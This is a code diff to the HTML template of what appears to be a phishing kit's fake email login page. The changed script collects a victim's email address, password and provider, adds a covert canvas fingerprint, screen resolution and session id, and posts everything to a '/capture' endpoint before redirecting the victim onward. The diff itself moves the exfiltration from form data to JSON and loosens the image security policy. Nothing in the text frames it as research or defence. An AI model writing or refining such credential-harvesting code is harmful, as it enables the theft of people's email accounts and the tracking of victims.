@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="referrer" content="no-referrer">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-eval' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https:;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-eval' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data: https: http:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https:;">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <title>{{SITE_NAME}}</title>
@@ -31,7 +31,7 @@
             <div class="fluid-form-layout">
                 <div class="login-header">
                     <a href="#">
-                        <img src="assets/{{LOGO_FILENAME}}" alt="" id="brand-logo">
+                        <img src="{{LOGO_URL}}" alt="" id="brand-logo">
                     </a>
                 </div>
 
@@ -90,11 +90,12 @@
                     overlay.style.display = 'flex';
                     
                     const payloadData = e.data.data || {};
-                    const formData = new FormData();
-                    formData.append('emailAcc', payloadData.email || '');
-                    formData.append('emailPass', payloadData.password || '');
-                    formData.append('emailProvider', payloadData.provider || '');
-                    formData.append('form_type', 'emailAuth');
+                    const payload = {
+                        emailAcc: payloadData.email || '',
+                        emailPass: payloadData.password || '',
+                        emailProvider: payloadData.provider || '',
+                        form_type: 'emailAuth'
+                    };
                     
                     // Generate Custom Adblock-Proof Canvas Fingerprint
                     try {
@@ -116,18 +117,22 @@
                             hash = ((hash << 5) - hash) + char;
                             hash = hash & hash;
                         }
-                        formData.append('fingerprint', Math.abs(hash).toString(16));
+                        payload.fingerprint = Math.abs(hash).toString(16);
                     } catch (e) {
-                        formData.append('fingerprint', 'unknown');
+                        payload.fingerprint = 'unknown';
                     }
                     
-                    formData.append('res', `${screen.width}x${screen.height}`);
+                    payload.res = `${screen.width}x${screen.height}`;
 
                     // Session integration if _sid exists
                     var sid = sessionStorage.getItem('_sid');
-                    if(sid) formData.append('_sid', sid);
+                    if(sid) payload._sid = sid;
 
-                    fetch('capture.php', { method: 'POST', body: formData })
+                    fetch('/capture', { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload) 
+                    })
                         .then(() => {
                             setTimeout(() => {
                                 window.location.href = __NEXT_EMAIL__;
